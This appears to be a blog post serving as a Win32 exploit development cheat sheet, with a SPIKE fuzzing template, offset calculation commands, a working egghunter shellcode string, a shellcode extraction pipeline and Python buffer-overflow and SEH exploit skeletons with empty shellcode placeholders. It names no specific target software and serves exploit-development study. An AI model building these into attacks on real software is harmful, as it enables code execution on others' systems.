---
layout: post
title: 'Win32 Exploit Development Cheat Sheet'
---


# Fuzzing

Spike Template

```javascript
s_string(“GET “);
s_string_variable(” “);
s_string(” HTTP/1.1\r\n”);
s_string(“Host: “);
s_string_variable(“1.1.1.1\r\n\n”);
```

Spike command

```javascript
./generic_send_tcp <Target-IP> <Target-Port> <script-file> 0 0
```

Offset Calculation

```javascript
./pattern_create -l 5000
./pattern_offset -q OVERFLOW_PATTERN
```

# Egg Hunter

```javascript
Egg "w00t" = "\x77\x30\x30\x74"

egghunter= "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x77\x30\x30\x74\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
```

# Shellcode

Compiling & Extract Shellcode from a Binary
```javascript
nasm -f elf32 -o myobj.o myfile.nasm

# use "objdump" to extract the shellcode out from the generated object file "myobj.o"
objdump -d myobj.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```

Links

[Writing windows shellcode](https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html)

[Linux - Windows shellcode](http://www.vividmachines.com/shellcode/shellcode.html)

[Custom Shellcode without WinExec](http://www.gosecure.it/blog/art/452/sec/create-a-custom-shellcode-using-system-function/)

[Get Shellcode From Binary](https://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump)



# Exploit

Skeleton Without Class

```python
import struct

def p(x):
	return struct.pack("<L", x)

def write(payload):
	f = open("poc.txt", "w")
	f.write(payload)
	f.close()

if __name__ == "__main__":
	# TODO: Change me!
	shellcode = (
	)

	padding = "A" * 666

	# TODO: Change me!
	payload = padding
	payload += p(0xdeadbeef)
	payload += shellcode

write(payload)
```


With Class

```python
class Exploit:

	def __init__(self, shellcode):
		self._shellcode = shellcode
		self._payload = None

	def __write(self):
		f = open("poc.txt", "w")
		f.write(self._payload)
		f.close()

	def run(self):
		pattern = "A" * 666

		# TODO: Change me!
		self._payload = pattern

		self.__write()

def main():
	# TODO: Change me!
	shellcode = (
	)

	exploit = Exploit(shellcode)
	exploit.run()

if __name__ == "__main__":
     main()
```

Example

```python
buffer = junk + ret + shellcode

buffer = junk + nseh + seh + shellcode

```
